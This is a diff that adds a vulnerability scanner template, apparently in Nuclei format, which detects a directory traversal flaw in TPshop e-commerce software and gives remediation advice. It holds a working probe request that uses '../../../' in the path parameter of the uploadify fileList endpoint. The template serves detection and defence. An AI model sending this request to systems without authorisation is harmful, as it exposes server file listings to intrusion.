@@ -1,0 +1,30 @@
+id: tpshop-directory-traversal
+info:
+  name: TPshop Directory Traversal
+  author:
+  - l0ne1y
+  description: |-
+    TPshop directory traversal vulnerability
+    The TPshop e-commerce software has a directory traversal vulnerability
+    Directory traversal is a security vulnerability caused by insufficient validation of user-supplied file names by a web server or web application. It allows attackers, by using certain special characters, to bypass the server's security restrictions and access arbitrary files (including files outside the web root), or even execute system commands.
+  severity: medium
+  remediation: |-
+    Official fix:
+    1. Upgrade the system to a non-vulnerable version, or download the security patch from the official website
+
+    Temporary fix:
+    1. Restrict user control over the path parameter
+    2. Restrict file types
+    3. Set functions as private rather than public where possible, to prevent exploitation from the frontend.
+requests:
+- matchers:
+  - type: word
+    words:
+    - '"state":"SUCCESS"'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../'
+  method: GET
